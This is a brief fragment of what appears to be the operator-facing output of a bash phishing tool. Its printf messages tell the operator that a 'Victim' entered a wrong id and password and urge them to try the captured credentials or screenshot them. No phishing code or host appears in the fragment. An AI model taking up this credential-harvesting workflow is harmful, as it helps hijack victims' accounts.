...
printf "\e[0m\e[92m Wrong Id nd Password... Victim Type Wrong Id And Password WE Also Tell Him\e[0m\n"
printf "\e[0m\e[92m   But Plzzz Try These Id Pass Once Your Self or Take a Screen Shot Now\e[0m\n"
printf "\e[0m\n"
